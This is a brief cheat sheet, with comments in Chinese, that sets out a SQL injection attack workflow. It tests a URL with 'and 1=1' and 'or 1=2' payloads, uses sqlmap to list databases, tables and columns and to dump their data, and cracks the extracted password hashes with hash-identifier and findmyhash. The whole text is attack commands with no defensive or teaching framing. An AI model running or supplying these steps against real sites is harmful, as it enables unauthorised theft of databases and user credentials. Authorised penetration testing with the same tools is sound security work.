#检测是否存在注入
url + and1=1,or1=2
#查找漏洞
sqlmap -u url --dbs
##指定数据库查表
sqlmap -u url -D db_name --tables
##指定表字段
sqlmap -u url -D db_name -T table_name --columns
##指定字段dump
sqlmap -u url -D db_name -T table_name -C column_name column --dump

##密码hash提取
Hash-identifier

findmyhash MD5 -h hash_value
